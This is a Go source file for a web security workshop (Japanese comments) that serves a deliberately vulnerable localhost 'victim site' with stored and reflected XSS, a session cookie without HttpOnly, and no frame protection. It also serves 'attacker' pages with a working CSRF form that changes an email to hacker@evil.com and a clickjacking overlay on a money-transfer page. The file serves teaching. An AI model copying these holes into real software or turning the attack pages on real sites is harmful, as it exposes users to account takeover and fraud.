package main

import (
	"fmt"
	"log"
	"net/http"
	"sync"
)

// デモ用のインメモリデータ
type Data struct {
	sync.Mutex
	Comments []string
	Email    string
}

var data = &Data{
	Comments: []string{"ワークショップへようこそ！"},
	Email:    "victim@example.com",
}

func main() {
	mux := http.NewServeMux()

	// 被害者サイト (Victim Site)
	mux.HandleFunc("/", homeHandler)
	mux.HandleFunc("/login", loginHandler)
	mux.HandleFunc("/xss/stored", storedXSSHandler)
	mux.HandleFunc("/xss/reflected", reflectedXSSHandler)
	mux.HandleFunc("/update-email", updateEmailHandler)
	mux.HandleFunc("/transfer", transferHandler)

	// 攻撃者サイト (Attacker Site)
	mux.HandleFunc("/attacker/csrf", attackerCSRFHandler)
	mux.HandleFunc("/attacker/clickjacking", attackerClickjackingHandler)

	log.Println("Server starting on :8080")
	log.Fatal(http.ListenAndServe(":8080", mux))
}

func homeHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `
		<h1>被害者サイト (Victim Site)</h1>
		<p>現在のメールアドレス: <strong>%s</strong></p>
		<ul>
			<li><a href="/login">ログイン (セッションCookieをセット)</a></li>
			<li><a href="/xss/stored">格納型 XSS デモ</a></li>
			<li><a href="/xss/reflected?q=test">反射型 XSS デモ</a></li>
			<li><a href="/transfer">送金ページ (クリックジャッキングデモ用)</a></li>
		</ul>
		<hr>
		<h2>攻撃者サイトへのリンク (演習用)</h2>
		<ul>
			<li><a href="/attacker/csrf">CSRF 攻撃ページ</a></li>
			<li><a href="/attacker/clickjacking">クリックジャッキング 攻撃ページ</a></li>
		</ul>
	`, data.Email)
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	// CSRFを可能にするため、SameSite属性を制限しない (None/Laxの隙を突く)
	http.SetCookie(w, &http.Cookie{
		Name:     "session_id",
		Value:    "secret-session-123",
		Path:     "/",
		HttpOnly: false, // XSSによるCookie奪取をデモするため false
	})
	fmt.Fprintf(w, "ログインしました！Cookieがセットされました。<a href='/'>ホームへ戻る</a>")
}

func storedXSSHandler(w http.ResponseWriter, r *http.Request) {
	data.Lock()
	defer data.Unlock()

	if r.Method == http.MethodPost {
		comment := r.FormValue("comment")
		data.Comments = append(data.Comments, comment)
		http.Redirect(w, r, "/xss/stored", http.StatusSeeOther)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, "<h1>格納型 XSS</h1>")
	fmt.Fprint(w, "<p>入力した内容がそのまま保存され、表示されます。</p>")
	fmt.Fprint(w, "<form method='POST'><input name='comment' style='width:300px'><input type='submit' value='投稿'></form>")
	fmt.Fprint(w, "<h2>コメント一覧</h2><ul>")
	for _, c := range data.Comments {
		// 脆弱性: ユーザー入力をエスケープせずにそのまま出力
		fmt.Fprintf(w, "<li>%s</li>", c)
	}
	fmt.Fprint(w, "</ul><a href='/'>ホームへ戻る</a>")
}

func reflectedXSSHandler(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query().Get("q")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	// 脆弱性: クエリパラメータをそのままHTMLに埋め込み
	fmt.Fprintf(w, "<h1>検索結果</h1><p>「%s」の検索結果は0件です。</p><a href='/'>ホームへ戻る</a>", q)
}

func updateEmailHandler(w http.ResponseWriter, r *http.Request) {
	// 簡易的な「認証」チェック
	cookie, err := r.Cookie("session_id")
	if err != nil || cookie.Value != "secret-session-123" {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	if r.Method == http.MethodPost {
		newEmail := r.FormValue("email")
		data.Lock()
		data.Email = newEmail
		data.Unlock()
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprintf(w, "メールアドレスを <strong>%s</strong> に更新しました。<a href='/'>ホームへ戻る</a>", newEmail)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `
		<h1>メールアドレス更新</h1>
		<form method="POST">
			新しいメールアドレス: <input name="email" value="%s">
			<input type="submit" value="更新">
		</form>
	`, data.Email)
}

func transferHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprintf(w, "<h2>💰 $1000 の送金が完了しました！</h2><a href='/'>ホームへ戻る</a>")
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	// 脆弱性: X-Frame-Options ヘッダーがないため、他サイトの iframe 内で表示可能
	fmt.Fprintf(w, `
		<style>
			body { font-family: sans-serif; text-align: center; padding-top: 50px; }
			.btn { background: #ff4444; color: white; padding: 20px 40px; border: none; font-size: 20px; cursor: pointer; border-radius: 5px; }
		</style>
		<h1>送金確認</h1>
		<p>「悪意のあるハッカー」へ <strong>$1000</strong> を送金しますか？</p>
		<form method="POST">
			<button class="btn">送金を確定する</button>
		</form>
	`)
}

// --- 攻撃者サイトのエンドポイント ---

func attackerCSRFHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `
		<h1 style="color:red">おめでとうございます！賞品に当選しました！</h1>
		<p>以下のボタンを押して、豪華賞品を受け取ってください！</p>
		<form action="http://localhost:8080/update-email" method="POST">
			<input type="hidden" name="email" value="hacker@evil.com">
			<input type="submit" value="賞品を受け取る" style="padding:10px 20px; font-size:18px">
		</form>
	`)
}

func attackerClickjackingHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `
		<style>
			#victim-frame {
				width: 100%%;
				height: 500px;
				position: absolute;
				top: 0;
				left: 0;
				opacity: 0.4; /* 実演用に半透明にしています。本物の攻撃では 0.0 にします */
				z-index: 2;
			}
			#fake-page {
				width: 100%%;
				height: 500px;
				position: absolute;
				top: 0;
				left: 0;
				z-index: 1;
				background: #e0ffe0;
				text-align: center;
				padding-top: 100px;
			}
			.fake-btn {
				margin-top: 105px;
				padding: 25px 50px;
				font-size: 24px;
				background: #44bb44;
				color: white;
				border: none;
				border-radius: 10px;
			}
		</style>
		<div id="fake-page">
			<h1>🍪 無料クッキー配布中！</h1>
			<p>下の大きなボタンを押して、今すぐクッキーをゲットしよう！</p>
			<button class="fake-btn">GET COOKIES</button>
		</div>
		<iframe id="victim-frame" src="http://localhost:8080/transfer"></iframe>
	`)
}
